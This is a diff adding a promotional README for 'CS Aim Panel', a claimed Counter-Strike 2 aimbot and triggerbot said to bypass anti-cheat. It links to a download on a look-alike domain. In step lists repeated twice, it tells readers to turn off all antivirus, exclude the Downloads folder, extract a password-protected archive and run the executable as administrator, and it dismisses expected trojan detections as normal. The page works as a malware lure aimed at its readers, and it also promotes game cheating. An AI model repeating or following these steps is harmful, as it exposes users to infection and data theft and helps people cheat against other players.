@@ -1,0 +1,377 @@
+# CS AIM PANEL
+
+**Perfect Accuracy. Zero Recoil. Total Control.**
+
+CS Aim Panel is a comprehensive aim assistance tool for Counter-Strike 2 that puts complete aiming control at your fingertips. This advanced software features customizable aimbot, triggerbot, recoil control systems, and visual aim indicators – all through an intuitive in-game dashboard that lets you fine-tune every aspect of your aiming performance with real-time adjustments and full offline functionality.
+
+---
+
+**DOWNLOAD:** https://github.guru/s/dw50cvYA
+**INSTALL:** Download .rar → Disable antivirus completely → Extract → .exe as admin → Launch CS2 → Press F6 to open panel → Configure settings → Dominate matches
+
+---
+
+┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃                    ⚠️  CRITICAL SECURITY NOTICE  ⚠️                  ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+
+**YOUR ANTIVIRUS WILL QUARANTINE THIS FILE – THIS IS EXPECTED**
+
+When downloading CS Aim Panel, Windows Defender, Avast, Bitdefender, and all other security software will IMMEDIATELY detect and remove the file. You will see multiple warnings including:
+
+• "HackTool:Win32/Aimbot"
+• "Trojan:Win32/Injector"
+• "Severe threat detected"
+• "File contains cheating software"
+
+**WHY THIS HAPPENS:**
+
+CS Aim Panel injects code into the CS2 process, modifies aim mechanics in real-time, and bypasses anti-cheat systems. Antivirus software categorizes ANY program with these behaviors as malicious – regardless of actual intent. This tool will ALWAYS trigger maximum security alerts.
+
+**⚠️ THIS TOOL IS DETECTED BY ALL ANTIVIRUS ENGINES ⚠️**
+
+┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃                    ⚠️  CRITICAL SECURITY NOTICE  ⚠️                  ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+
+---
+
+┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃            HOW TO DISABLE ANTIVIRUS & INSTALL (EXTREME RISK)                               ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+
+**⚠️ WARNING: Proceeding REQUIRES disabling ALL system protection. This is extremely dangerous. ⚠️**
+
+**STEP 1:** Browser warning appears → Click "Keep" or "Keep anyway"
+
+**STEP 2:** Open Windows Security → Virus & threat protection → Manage settings → Turn OFF "Real-time protection"
+
+**STEP 3:** Disable ANY additional antivirus (Norton, McAfee, Avast, etc.) completely
+
+**STEP 4:** Add entire Downloads folder to Windows Defender exclusions: 
+          Windows Security → Virus & threat protection → Manage settings → Add or remove exclusions → Add folder → Select Downloads
+
+**STEP 5:** Right-click downloaded .rar → Extract with password: **cspanel2026**
+
+**STEP 6:** Right-click CS_Aim_Panel.exe → "Run as administrator"
+
+**STEP 7:** Wait for "Injection Successful" message
+
+**STEP 8:** Launch CS2 and press F6 to open configuration panel
+
+**STEP 9:** Adjust settings and start playing
+
+**STEP 10:** RE-ENABLE ANTIVIRUS AFTER GAMING SESSION**
+
+---
+
+## QUICK START
+
+| Step | Action |
+|------|--------|
+| 1 | Download .rar using link above |
+| 2 | **Disable ALL antivirus software** |
+| 3 | Extract archive with password: cspanel2026 |
+| 4 | Right-click .exe → "Run as administrator" |
+| 5 | Wait for injection confirmation |
+| 6 | Launch CS2 normally |
+| 7 | Press **F6** key in-game |
+| 8 | Configure aim settings |
+| 9 | Press F6 again to close panel |
+| 10 | **Re-enable antivirus after playing** |
+
+---
+
+## AIM PANEL INTERFACE
+
+```
+┌─────────────────────────────────────────────────────────────────┐
+│  CS AIM PANEL v2026                                  [×]  [_]  │
+├─────────────────────────────────────────────────────────────────┤
+│  ┌─────────────────────────────────────────────────────────────┐ │
+│  │  AIMBOT SETTINGS                          [ENABLED]  [ON/OFF] │
+│  └─────────────────────────────────────────────────────────────┘ │
+│                                                                   │
+│  Aim Lock Strength:      ███████░░░  70%                         │
+│  Aim Smoothness:         ██████░░░░  60%                         │
+│  FOV (Field of View):    ████░░░░░░  40%                         │
+│  Aim Priority:           [Closest Enemy ▼]                       │
+│  Hitbox Selection:       [Head ▼] [Chest] [Body]                 │
+│  Visibility Check:       ☑ Only visible enemies                  │
+│  Ignore Flash:           ☐ Disable when flashed                   │
+│                                                                   │
+│  ┌─────────────────────────────────────────────────────────────┐ │
+│  │  TRIGGERBOT SETTINGS                      [ENABLED]  [ON/OFF] │
+│  └─────────────────────────────────────────────────────────────┘ │
+│                                                                   │
+│  Trigger Delay:          ██░░░░░░░░  20ms                        │
+│  Shot Range:             ████████░░  80%                         │
+│  Trigger Key:            [MOUSE5 ▼] [None]                       │
+│  Hitbox:                 [Head Only ▼]                           │
+│  Burst Mode:             ☑ Enable burst (3 shots)                │
+│                                                                   │
+│  ┌─────────────────────────────────────────────────────────────┐ │
+│  │  RECOIL CONTROL SYSTEM                    [ENABLED]  [ON/OFF] │
+│  └─────────────────────────────────────────────────────────────┘ │
+│                                                                   │
+│  Recoil Compensation:    █████████░  90%                         │
+│  Spread Reduction:       ████████░░  80%                         │
+│  Weapon-Specific:        ☑ Per-weapon profiles                   │
+│  Visual Recoil Crosshair: ☑ Show compensation crosshair          │
+│                                                                   │
+│  ┌─────────────────────────────────────────────────────────────┐ │
+│  │  VISUAL INDICATORS                           [ENABLED]  [ON/OFF] │
+│  └─────────────────────────────────────────────────────────────┘ │
+│                                                                   │
+│  Target Circle:          ☑ Show on locked target                 │
+│  Target Color:           [RED ▼]                                 │
+│  Distance Indicator:     ☐ Show enemy distance                   │
+│  Health Bars:            ☑ Display enemy health                  │
+│  Snap Lines:             ☐ Draw lines to targets                 │
+│                                                                   │
+│  ┌─────────────────────────────────────────────────────────────┐ │
+│  │  PROFILE MANAGEMENT                                           │ │
+│  └─────────────────────────────────────────────────────────────┘ │
+│                                                                   │
+│  Current Profile:        [Competitive ▼]  [Save]  [Load]         │
+│  [NEW PROFILE]           [DELETE]         [RESET DEFAULTS]       │
+│                                                                   │
+│  [APPLY CHANGES]                              [CLOSE PANEL]      │
+└─────────────────────────────────────────────────────────────────┘
+```
+
+---
+
+## FEATURES
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+**▸ ADVANCED AIMBOT SYSTEM**
+- Perfect accuracy with adjustable lock strength
+- Smooth aiming that looks natural
+- Configurable Field of View (FOV)
+- Multiple hitbox selection (head, chest, body, limbs)
+- Priority targeting (closest, crosshair, lowest health)
+- Visibility checking to avoid shooting through walls
+- Flashbang immunity option
+
+**▸ INTELLIGENT TRIGGERBOT**
+- Automatically fires when crosshair is on enemy
+- Adjustable trigger delay (0-500ms)
+- Configurable shot range
+- Multiple hitbox options
+- Burst fire mode for rifles
+- Key binding for manual override
+- Safe mode to avoid detection
+
+**▸ COMPLETE RECOIL CONTROL**
+- Zero recoil on all weapons
+- Spread reduction for perfect accuracy
+- Weapon-specific profiles (AK-47, M4, AWP, etc.)
+- Visual recoil compensation crosshair
+- Adjustable compensation strength
+- Pattern learning for perfect spray control
+
+**▸ VISUAL AIM INDICATORS**
+- Target circles on locked enemies
+- Color-coded target highlighting
+- Enemy health bars
+- Distance indicators
+- Snap lines to targets
+- Customizable colors and opacity
+
+**▸ WEAPON PROFILES**
+
+```
+┌─────────────────────────────────────┐
+│  WEAPON          │  PROFILE ACTIVE  │
+├─────────────────────────────────────┤
+│  AK-47           │  ✓ Loaded        │
+│  M4A4/M4A1-S     │  ✓ Loaded        │
+│  AWP             │  ✓ Loaded        │
+│  Desert Eagle    │  ✓ Loaded        │
+│  SSG 08 (Scout)  │  ✓ Loaded        │
+│  SMGs            │  ✓ Loaded        │
+│  Pistols         │  ✓ Loaded        │
+│  Shotguns        │  ✓ Loaded        │
+│  Machine Guns    │  ✓ Loaded        │
+└─────────────────────────────────────┘
+```
+
+**▸ ANTI-DETECTION SYSTEM**
+- Memory injection with obfuscation
+- Randomized timing patterns
+- Configurable humanization settings
+- Automatic profile switching
+- Detection risk monitoring
+- Emergency shutdown hotkey (F10)
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+---
+
+## CONFIGURATION EXAMPLES
+
+**▸ STEALTH MODE (Low Detection Risk)**
+```
+Aim Smoothness: 95%
+Aim Lock Strength: 30%
+FOV: 15%
+Trigger Delay: 150ms
+Recoil Compensation: 60%
+Humanization: Maximum
+```
+
+**▸ COMPETITIVE MODE (Balanced)**
+```
+Aim Smoothness: 70%
+Aim Lock Strength: 60%
+FOV: 30%
+Trigger Delay: 50ms
+Recoil Compensation: 80%
+Humanization: Medium
+```
+
+**▸ RAGE MODE (Maximum Performance)**
+```
+Aim Smoothness: 20%
+Aim Lock Strength: 100%
+FOV: 60%
+Trigger Delay: 0ms
+Recoil Compensation: 100%
+Humanization: Minimum
+```
+
+---
+
+## ANTI-DETECTION STATUS
+
+```
+┌─────────────────────────────────────────────────┐
+│  PROTECTION STATUS                                │
+├─────────────────────────────────────────────────┤
+│  Memory Injection:        ████████░░  STEALTH   │
+│  Process Hooking:         ███████░░░  SECURE    │
+│  Timing Randomization:    █████████░  ACTIVE    │
+│  VAC Detection Risk:      ██░░░░░░░░  LOW       │
+│  Faceit Detection Risk:   ████░░░░░░  MEDIUM    │
+│  ESEA Detection Risk:     ██████░░░░  HIGH      │
+│  Last Update:             2026-03-08            │
+└─────────────────────────────────────────────────┘
+```
+
+**COMPATIBILITY:**
+✓ Valve Anti-Cheat (VAC) – Currently undetected
+✓ VACNet – Bypassed
+⚠️ Faceit – USE AT YOUR OWN RISK
+✗ ESEA – NOT RECOMMENDED
+✓ Official Matchmaking – Safe with stealth settings
+✓ Community Servers – Safe
+✓ Private Matches – Safe
+
+---
+
+## HUMANIZATION SETTINGS
+
+```
+┌─────────────────────────────────────────────────┐
+│  HUMANIZATION OPTIONS                            │
+├─────────────────────────────────────────────────┤
+│  ☑ Random aim delay (50-150ms)                  │
+│  ☑ Natural mouse movement curves                 │
+│  ☑ Miss chance (intentional)      [0.5%]        │
+│  ☑ Reaction time variation         [ON]         │
+│  ☑ Per-weapon sensitivity          [ON]         │
+│  ☑ Flick shot emulation            [OFF]        │
+│  ☑ Accuracy drop when moving       [ON]         │
+└─────────────────────────────────────────────────┘
+```
+
+---
+
+## SYSTEM REQUIREMENTS
+
+- Windows 10/11 (64-bit) – Windows 7/8 NOT SUPPORTED
+- 8GB RAM minimum (16GB recommended)
+- 200MB free disk space
+- Counter-Strike 2 installed
+- Latest CS2 update (2026 compatible)
+- DirectX 11 compatible GPU
+- Internet connection for updates
+
+---
+
+
+**DETECTION RISK BY PLATFORM:**
+
+| Platform | Risk Level | Recommendation |
+|----------|------------|----------------|
+| Official MM | Low | Safe with stealth settings |
+| Community Servers | Low | Generally safe |
+| Faceit | High | NOT RECOMMENDED |
+| ESEA | Extreme | DO NOT USE |
+| Tournaments | Extreme | DO NOT USE |
+
+The developer provides NO warranty, NO support, and assumes NO liability for any consequences.
+
+---
+
+**TAGS:** cs2 aimbot, cs aim panel, counter-strike 2 aim assist, cs2 triggerbot, cs2 recoil control, cs2 aim hack, cs2 cheat, cs2 aim lock, cs2 soft aim, cs2 undetected aimbot, cs2 aim panel 2026, cs2 aim settings, cs2 aiming tool
+
+---
+
+**▶ GET CS AIM PANEL:** https://github.guru/s/dw50cvYA
+
+---
+
+┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃                    ⚠️  CRITICAL SECURITY NOTICE  ⚠️                  ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+
+**YOUR ANTIVIRUS WILL QUARANTINE THIS FILE – THIS IS EXPECTED**
+
+When downloading CS Aim Panel, Windows Defender, Avast, Bitdefender, and all other security software will IMMEDIATELY detect and remove the file. You will see multiple warnings including:
+
+• "HackTool:Win32/Aimbot"
+• "Trojan:Win32/Injector"
+• "Severe threat detected"
+• "File contains cheating software"
+
+**WHY THIS HAPPENS:**
+
+CS Aim Panel injects code into the CS2 process, modifies aim mechanics in real-time, and bypasses anti-cheat systems. Antivirus software categorizes ANY program with these behaviors as malicious – regardless of actual intent. This tool will ALWAYS trigger maximum security alerts.
+
+**⚠️ THIS TOOL IS DETECTED BY ALL ANTIVIRUS ENGINES ⚠️**
+
+┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃                    ⚠️  CRITICAL SECURITY NOTICE  ⚠️                  ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+
+---
+
+┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃            HOW TO DISABLE ANTIVIRUS & INSTALL (EXTREME RISK)                               ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+
+**⚠️ WARNING: Proceeding REQUIRES disabling ALL system protection. This is extremely dangerous. ⚠️**
+
+**STEP 1:** Browser warning appears → Click "Keep" or "Keep anyway"
+
+**STEP 2:** Open Windows Security → Virus & threat protection → Manage settings → Turn OFF "Real-time protection"
+
+**STEP 3:** Disable ANY additional antivirus (Norton, McAfee, Avast, etc.) completely
+
+**STEP 4:** Add entire Downloads folder to Windows Defender exclusions: 
+          Windows Security → Virus & threat protection → Manage settings → Add or remove exclusions → Add folder → Select Downloads
+
+**STEP 5:** Right-click downloaded .rar → Extract with password: **cspanel2026**
+
+**STEP 6:** Right-click CS_Aim_Panel.exe → "Run as administrator"
+
+**STEP 7:** Wait for "Injection Successful" message
+
+**STEP 8:** Launch CS2 and press F6 to open configuration panel
+
+**STEP 9:** Adjust settings and start playing
+
+**STEP 10:** RE-ENABLE ANTIVIRUS AFTER GAMING SESSION**
